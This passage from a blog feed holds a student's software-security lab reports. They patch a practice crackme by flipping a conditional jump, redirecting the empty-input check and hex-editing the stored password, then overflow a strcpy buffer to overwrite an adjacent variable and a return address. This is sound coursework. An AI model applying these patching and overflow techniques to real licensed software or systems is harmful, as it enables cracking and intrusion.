<h4 id="（二）Ollydbg动态调试crackme-exe"><a href="#（二）Ollydbg动态调试crackme-exe" class="headerlink" title="（二）Ollydbg动态调试crackme.exe"></a>（二）Ollydbg动态调试crackme.exe</h4><p>1.在Ollydbg查找字符串，查找到字符串“crackmepassword”。找到后双击字符串，可以找到程序中比较判断部分逻辑代码，如下图所示。由此可知，正确密码即为字符串“crackmepassword”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img27.png" alt="图27"></p>
<p>2.重新运行程序，尝试输入密码“crackmepassword”，任意输入用户名，即可注册成功。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img28.png" alt="图28"></p>
<p>用户名为“222”</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img29.png" alt="图29"></p>
<p>用户名为“admin”</p>
<p>3.由Ollydbg动态调试汇编代码可知，程序判断的关键跳转逻辑在程序的0040161E处，JNZ表示比较结果不同则跳转。下方的call语句均为程序输出部分，负责弹窗输出“注册失败！”及“注册成功！”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img30.png" alt="图30"></p>
<p>4.因此，字符串“crackmepassword”上方语句即为弹出程序初始窗口、程序判断用户名及密码是否为空并弹窗输出“请输入用户名！”“请输入密码！”的汇编代码。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img31.png" alt="图31"></p>
<h4 id="（三）三种方法破解crackme-exe程序"><a href="#（三）三种方法破解crackme-exe程序" class="headerlink" title="（三）三种方法破解crackme.exe程序"></a>（三）三种方法破解crackme.exe程序</h4><p><strong>方法一：将跳转逻辑中JNZ修改为JZ</strong></p>
<p>将程序0040161E处汇编代码中不为零时跳转（JNZ）修改为为零时跳转（JZ），即将此汇编语句中操作码由75修改为74，即可在输入错误密码时注册成功，而在输入正确密码时注册失败。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img32.png" alt="图32"></p>
<p>由图可知，JNZ SHORT crackme.00401637即为注册成功&#x2F;失败判断跳转。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img33.png" alt="图33"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img34.png" alt="图34"></p>
<p>修改：将JNZ SHORT crackme.00401637改成JE SHORT crackme.00401637。修改后再次运行程序，如下两图可知，输入任意错误密码可以注册成功，成功实现破解crackme.exe程序。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img35.png" alt="图35"></p>
<p>用户名为：“admin”，密码为“crackmepassword”时注册失败</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img36.png" alt="图36"></p>
<p>用户名为“admin”，密码为“1”时注册成功</p>
<p><strong>方法二：将密码（或用户名）为空的跳转逻辑修改为跳转至注册成功</strong></p>
<p>1.由（二）中对汇编代码的分析可知，程序004015CE处的代码即为程序判断密码为空时实现跳转到“请输入密码”弹窗。为了验证这个结论，在程序调用MessageBox处（004015DB）双击设置断点后运行程序。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img37.png" alt="图37"></p>
<p>在004015DB处设置断点</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img38.png" alt="图38"></p>
<p>输入用户名为“admin”，密码为空</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img39.jpg" alt="图39"></p>
<p>点击注册后，程序运行到断点处</p>
<p>2.由以上结果可知，004015CE处为程序判断密码是否为空的跳转逻辑代码。为了修改相应弹窗内容，要使这部分入栈及调用MessageBox代码全部替换为“注册成功”弹窗的入栈及调用MessageBox代码。</p>
<p>因此，将程序004015CE跳转逻辑由“当不为零（密码不为空）时跳转至0015E2进行密码字符串的比较”修改为“当为零（密码为空）时跳转至0040161A处进行注册成功弹窗”。即将汇编语句修改为JZ SHORT 0040161A。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img40.png" alt="图40"></p>
<p>3.修改后运行程序，输入用户名为admin，密码为空时即可显示“注册成功！”弹窗。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img41.png" alt="图41"></p>
<p>输入用户名为“admin”，密码为空时显示注册成功</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img42.png" alt="图42"></p>
<p>输入用户名为“admin”，密码为正确密码“crackmepassword”显示请输入密码</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img43.png" alt="图43"></p>
<p>输入用户名为“admin”，密码为错误密码“1”显示请输入密码</p>
<p>4.同理可知，也可以将程序跳转逻辑修改为“当用户名为空时，跳转到显示注册成功弹窗的代码”。即将程序004015B2处汇编语句修改为JZ SHORT 0040161A。修改完成后运行程序，用户名为空时不进行输入直接点击注册，显示弹窗“注册成功”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img44.png" alt="图44"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img45.png" alt="图45"></p>
<p>用户名为空时显示注册成功</p>
<p>至此实现破解crackme.exe程序。</p>
<p><strong>方法三：将正确密码字符串修改为“mycrackpassword”</strong></p>
<p>1.找到密码字符串“crackmepassword”，在下方HEX数据框中根据ASCII码将密码字符串修改为“mycrackpassword”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img46.png" alt="图46"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img47.png" alt="图47"></p>
<p>2.修改完成后点击运行程序，任意输入用户名，输入密码“mycrackpassword”，注册成功；输入原始密码“mycrackpassword”时，注册失败。成功实现破解crackme.exe程序。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img48.png" alt="图48"></p>
<p>用户名为“admin”，密码为“mycrackpassword”时注册成功</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img49.png" alt="图49"></p>
<p>用户名为“admin”，密码为“crackmepassword”时注册失败</p>
<p>附件：crackme破解程序</p>
<p>crackme1.exe：输入任意错误密码时显示注册成功，输入正确密码crackmepassword时则显示注册失败。</p>
<p>crackme2.1.exe：输入任意用户名，密码为空时显示注册成功；输入任意密码则显示“请输入密码！”</p>
<p>crackme2.2.exe：用户名为空时，点击注册即显示注册成功。</p>
<p>crackme3.exe：输入任意用户名，密码为修改后密码mycrackpassword时显示注册成功；输入正确密码或其他错误密码时则注册失败。</p>
<h3 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h3><p>通过本次实验，我对软件安全中常见的身份验证绕过机制有了更加深入和直观的认识。crackme.exe 作为一个典型的口令验证程序，其验证逻辑在未加保护的情况下暴露出多处可被篡改的脆弱点。实验中我采用的三种破解方法：修改关键跳转条件、利用空输入绕过验证、篡改密码明文数据。分别从控制流、输入校验和数据完整性三个层面揭示了软件在设计上的安全风险。</p>
<p>首先，验证逻辑中的条件跳转（JNZ&#x2F;JZ）直接决定了程序的分支走向，而这一机制若暴露于可修改的内存环境中，极易被攻击者利用，从而完全颠覆原有的安全判断。其次，对用户输入的有效性检查本应是防御的第一道防线，但若检查逻辑本身存在缺陷或被篡改，反而可能成为绕过验证的入口。最后，程序中硬编码的敏感信息（如密码字符串）以明文形式存储，缺乏必要的混淆或加密措施，使得攻击者可通过静态或动态分析直接定位并修改关键数据。</p>
<p>这次实验也让我进一步认识到，软件安全并非仅在开发完成后通过外部防护手段来保障，而是需要在编码、编译、乃至分发前的各个环节中，系统性地融入安全思维。作为《软件安全》课程的一次实践，本实验不仅锻炼了我使用调试工具进行动态分析的能力，更深化了我对“安全在于细节”这一理念的理解——任何微小的逻辑疏漏或实现上的不慎，都可能在恶意分析面前被放大为严重的安全漏洞。今后在参与软件开发时，我将更加注重代码的健壮性、敏感信息的保护机制以及整体架构的安全性设计，从而在根源上降低此类风险的发生概率。</p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验2：栈溢出</title>
    <url>/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全第二次实验报告"><a href="#软件安全第二次实验报告" class="headerlink" title="软件安全第二次实验报告"></a>软件安全第二次实验报告</h2><h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><ol>
<li>实验环境：Windows（wsl）或Linux下。</li>
</ol>
<p>工具：Ollydbg、IDA、gdb、x64dbg等。</p>
<ol start="2">
<li>实验要求</li>
</ol>
<p>（1）通过对程序输入的密码的长度、内容等修改，使用任意一种工具（Ollydbg）来验证缓冲区溢出的发生（参考提供的两个代码，附件&#x2F;overflow_ret和附件&#x2F;overflow_var），完成淹没相邻变量改变程序流程、完成淹没返回地址改变程序流程。<strong>（以上记作实验一）</strong></p>
<p>（2）以StackOverrun程序（附件&#x2F;StackOverrun.exe.zip）为靶子，通过使用（1）中的任意一种工具进行调试；分析PE格式加载到内存中的地址变化，请写出代码段地址，从文件存储到内存的变化；挑选其中一处函数的调用，详细分析，调用时sp，bp，ip的变化，要求以程序运行的顺序记录跳转时的这些寄存器的变化，特别是栈的变化，要求对这些内存各个部分的截图，并附加说明到报告中；推测程序的功能，并描述出来。<strong>（以上记作实验二）</strong></p>
<p>（3）尝试修改StackOverrun程序的流程，通过淹没返回地址，比如可以尝试用jmp esp的方式（方式可以自选），让其调用bar函数并输出结果。<strong>（以上记作实验三）</strong></p>
<h3 id="实验一步骤与结果"><a href="#实验一步骤与结果" class="headerlink" title="实验一步骤与结果"></a>实验一步骤与结果</h3><p><strong>（一）读懂密码验证程序</strong></p>
<p>1.进入虚拟机，打开栈溢出实验文件夹下stackvar文件夹中的overflow_var.cpp文件。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img1.png" alt="图1"></p>
<p>2.程序包含两部分：verify_password函数和main函数。</p>
<p>（1）首先分析verify_password函数：</p>
<p>a）传入参数：char *password是一个名为password的字符数组。</p>
<p>b）函数中定义了一个整型变量authenticated和一个长度为8的字符数组buffer[]。</p>
<p>c）调用strcmp函数比较password和常量PASSWORD两个字符串，并将比较结果赋值给authenticated。</p>
<p>d）进行字符串比较后，调用strcpy函数将字符串password的内容复制到buffer数组中。</p>
<p>e）函数最后返回变量authenticated。</p>
<p>（2）接下来分析main函数：</p>
<p>a）首先定义了一个初始值为0的整型变量valid_flag和一个长度为1024的字符数组password[]。</p>
<p>b）接下来程序开始一个while循环，循环中打印“please input password:”后等待用户输入，将输入值赋值给password。</p>
<p>c）调用veriy_password函数，将password作为参数传入，返回值赋值给valid_flag。</p>
<p>d）若valid_flag不等于0，即strcmp结果不为0，说明password与正确密码PASSWORD不符，打印提示信息“incorrect password!\n\n”，继续下一轮while循环。</p>
<p>e）若valid_flag等于0，即strcmp结果为0，说明password与正确密码PASSWORD相同，打印提示信息“Congratulation! You have passed the verification!\n”，并跳出while循环，程序结束。</p>
<p>（3）由以上分析可知，密码验证程序起到的作用是：正确密码为1234567。用户输入一个字符串，若与正确密码相同，则通过验证、程序结束；若与正确密码不同，则验证失败，继续下一次验证。</p>
<p><strong>（二）创建可执行程序并进行测试</strong></p>
<p>1.打开Visual C++，新建一个工程，命名为main2_project。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img2.png" alt="图2"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img3.png" alt="图3"></p>
<p>2.在工程中新建一个空白C++文件（选择C++ Source File），命名为main2.cpp。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img4.png" alt="图4"></p>
<p>3.将main.cpp的代码内容复制到main2.cpp中。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img5.png" alt="图5"></p>
<p>4.运行程序并输入密码进行尝试。</p>
<p>（1）输入不超过7位的错误密码，如“12333”、“12345”，程序输出“incorrect password!”后继续下一轮循环。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img6.png" alt="图6"></p>
<p>（2）直至输入正确密码“1234567”，程序输出“Congratulation！You have passed the verification!”并结束。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img7.png" alt="图7"></p>
<p>（3）输入8位密码如“12345678”、“qqqqqqqq”时，程序均判断密码正确、通过验证。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img8.png" alt="图8"></p>
<p>（4）当输入比8位稍长的密码如“1234567890”时，程序判断密码错误。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img9.png" alt="图9"></p>
<p>（5）当输入很长的密码如20位密码“12345678901234567890”时，程序不进行输出而直接结束。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img10.png" alt="图10"></p>
<p><strong>（三）开始调试并测试四种情况</strong></p>
<p>1.使用Ollydbg打开我们生成的exe文件，开始运行，输入几个短的错误密码如“12345”等，找到我们要调试的代码段。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img11.png" alt="图11"></p>
<p>2.找到strcpy语句（比较靠上），双击此语句设置断点。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img12.png" alt="图12"></p>
<p>3.点击运行后，程序走到strcpy语句时自动停止，然后点击不进入函数的单步调试按钮，点击后程序运行到strcpy语句的下一行代码。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img13.png" alt="图13"></p>
<p>4.在strcpy函数执行后，查看缓冲区的内容。输入情况分为以下四种：</p>
<p>（1）短的错误密码“123”：可以看到两个地址中的值被赋值了“123”，同时0012FB18也为123。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img14.png" alt="图14"></p>
<p>程序执行到strcpy函数时的缓冲区情况</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img15.png" alt="图15"></p>
<p>strcpy函数执行后的缓冲区情况</p>
<p>（2）正确密码“1234567”：可以看到有两个地址中的值被赋值为“1234567”；且此情况与（1）情况均属于程序正常功能，比较后可知地址0012FABC处的值均为0012FB24，故推测此值为程序正常返回地址值。并且发现程序判断成密码输入正确并自动关闭。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img16.png" alt="图16"></p>
<p>程序执行到strcpy函数时的缓冲区情况</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img17.png" alt="图17"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img18.png" alt="图18"></p>
<p>strcpy函数执行后的缓冲区情况</p>
<p>（3）八位错误密码“12345678”：可以看到由于我们输入的字符串超过了buffer数组最大长度，结尾结束符’\0’将会覆盖邻接变量；但返回地址值0012FB24仍与此前相同，可见输入八位密码并未影响返回地址。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img19.png" alt="图19"></p>
<p>程序执行到strcpy函数时的缓冲区情况</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img20.png" alt="图20"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img21.png" alt="图21"></p>
<p>strcpy函数执行后的缓冲区情况</p>
<p>（4）二十位的错误密码“12345678901234567890”：可见由于我们填写的字符串过长，已经将邻接的变量覆盖了；而且返回地址值也不再是0012FB24，而是变成了0012FF80，说明20位的密码影响了返回地址值。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img22.png" alt="图22"></p>
<p>程序执行到strcpy函数时的缓冲区情况</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img23.png" alt="图23"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img24.png" alt="图24"></p>
<p>strcpy函数执行后的缓冲区情况</p>
<p>5.为了看到程序的输出结果，将strcpy处的断点取消，查找字符串找到程序输出的提示信息“Congratulation！…”并双击跳转到此处，双击设置断点。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img25.png" alt="图25"></p>
<p>6.输入八位错误密码“12345678”，点击运行发现程序运行至断点处，单步步过至程序输出“Congratulation! You have passed the verification!”，可知八位错误密码可以通过程序验证。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img26.png" alt="图26"></p>
<p>程序运行至断点处</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img27.png" alt="图27"></p>
<p>程序输出验证通过的提示信息</p>
<p><strong>（四）验证补码</strong></p>
<p>1.仍然在调用strcpy函数处设置断点，点击运行输入“01234567”，程序运行至断点处，并点击单步步过。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img28.png" alt="图28"></p>
<p>程序运行至strcpy处时的缓冲区情况</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img29.png" alt="图29"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img30.png" alt="图30"></p>
<p>strcpy执行后的缓冲区情况</p>
<p>2.由以上结果可知，函数返回地址0012FB24仍然正确未受影响。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img31.png" alt="图31"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img32.png" alt="图32"></p>
<p>3.取消strcpy处的断点，而是在输出“incorrect…”处设置断点，点击运行并单步步过直至程序输出“incorrect password!”，可知程序判断密码错误、验证失败，符合程序正常功能。</p>
<p><strong>（五）分析原理</strong></p>
<p>由以上操作及其结果，分成以下三种情况对此程序进行分析，分别为：淹没邻接变量、淹没返回地址、验证补码。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img33.png" alt="图33"></p>
<p>程序堆栈情况</p>
<p><strong>1.淹没邻接变量</strong></p>
<p>当输入大于正确密码1234567的八位密码如“12345678”时，比字符数组buffer最大长度多一个字节，即为字符串结尾的空字符’\0’。</p>
<p>（1）函数verify_password执行strcmp语句后，由于所输入的password大于1234567，判断结果为authenticated&#x3D;1。</p>
<p>（2）空字符淹没邻接变量authenticated，导致返回值authenticated&#x3D;0。</p>
<p>（3）但返回地址未受影响，因此函数verify_password执行完毕后程序可以根据返回地址正确地返回主函数执行接下来的if判断语句。</p>
<p>程序根据verify_password函数返回值authenticated&#x3D;0判断密码正确、通过验证。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img34.png" alt="图34"></p>
<p>淹没邻接变量的堆栈情况</p>
<p><strong>2.淹没返回地址</strong></p>
<p>当输入很长的错误密码如“1234567891234567890”时，比字符数组buffer最大长度多出12个字节。</p>
<p>（1）函数verify_password执行strcmp语句后，由于所输入的password大于1234567，判断结果为authenticated&#x3D;1。</p>
<p>（2）多出的前四个字符淹没邻接变量authenticated，导致返回值authenticated&#x3D;“9012”。</p>
<p>（3）其余八个字符淹没堆栈指针及返回地址，导致返回地址错误，程序不能正确地返回主函数main，程序崩溃退出。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img35.png" alt="图35"></p>
<p>淹没返回地址的堆栈情况</p>
<p><strong>3.验证补码</strong></p>
<p>当输入小于正确密码1234567的八位密码如“01234567”时，比字符数组buffer最大长度多一个字节，即为字符串结尾的空字符’\0’。</p>
<p>（1）函数verify_password执行strcmp语句后，由于所输入的password小于1234567，判断结果为authenticated&#x3D;-1，在内存中-1采用补码0xFFFFFFFF表示。</p>
<p>（2）空字符淹没邻接变量authenticated，导致返回值authenticated在内存中表现为0xFFFFFF00，因此authenticated≠0。</p>
<p>（3）但返回地址未受影响，因此函数verify_password执行完毕后程序可以根据返回地址正确地返回主函数执行接下来的if判断语句。程序根据verify_password函数返回值authenticated≠0判断密码错误、验证失败。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img36.png" alt="图36"></p>
<p>验证补码的堆栈情况</p>
<h3 id="实验二步骤与结果"><a href="#实验二步骤与结果" class="headerlink" title="实验二步骤与结果"></a>实验二步骤与结果</h3><p><strong>（一）初步分析</strong></p>
<p>1.首先直接打开程序查看内容</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img37.png" alt="图37"></p>
<p>2.再打开ida查看，发现只有两个函数</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img38.png" alt="图38"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img39.png" alt="图39"></p>
<p><strong>（二）分析PE格式加载到内存中的地址变化</strong></p>
<p>1.用x32dbg打开exe程序进行分析，以下是进入程序时的内存情况。。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img40.png" alt="图40"></p>
<p>2.用x32dbg打开，可以看到foo()的起始地址为0x00401000,bar()的起始地址为00401060, 分析汇编代码知道main()函数的起始地址为0x00401070，可以在这三个位置分别设置断点，进行代码分析，观察内存中地址的变化。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img41.png" alt="图41"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img42.png" alt="图42"></p>
<p>3.从main函数开始，将401000（foo）的地址和字符串”Address of foo &#x3D; %p\n”4060DC分别压入栈（esp为0019FF30）中，并转移至4010B0地址。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img43.png" alt="图43"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img44.png" alt="图44"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img45.png" alt="图45"></p>
<p>4.在4010B0执行完后，再将401060（bar）的地址和字符串”Address of bar&#x3D; %p\n”4060C4分别压入栈中，esp-8（8个字节），并转移至4010B0地址，并将返回地址压入栈中。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img46.png" alt="图46"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img47.png" alt="图47"></p>
<p>5.在4010B0执行完后。再将ecx压入栈中，跳转至401000处，其实就是跳转到foo函数中。此时esp继续-4，然后将main函数的返回地址压入栈中，进入foo函数。此时esp为0019FF20。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img48.png" alt="图48"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img49.png" alt="图49"></p>
<p>6.进入foo，esp进行-12，然后将esi，edi压入栈中，还有要打印的“ My stack looks like: %p %p %p %p %p %p %p %p %p %p ”的地址0x00406070压入栈，esp又减去12，再转移到 4010B0出，并压入返回地址，esp-4，此时esp为0019FF08。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img50.png" alt="图50"></p>
<p>7.当程序走到40101C处时，此时esp为0019FF08，ebp为0019FF74。但是我们发现应该带着输入运行程序。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img51.png" alt="图51"></p>
<p>8.我们带着输入123456，运行程序到401038处，此时将ecx（我们的输入）压入栈，还有push 40606C，压入返回地址，然后转移到4010B0，此时esp-8，然后返回。esp &#x3D; 0019FF00。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img52.png" alt="图52"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img53.png" alt="图53"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img54.png" alt="图54"></p>
<p>9.然后push406030，esp-4再esp+10。然后弹出esi，edi，esp+4，最后esp+c。最后esp &#x3D; 0019FF24。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img55.png" alt="图55"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img56.png" alt="图56"></p>
<p>10.最后，返回main函数，esp+14。最终esp &#x3D; 0019FF38。程序结束。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img57.png" alt="图57"></p>
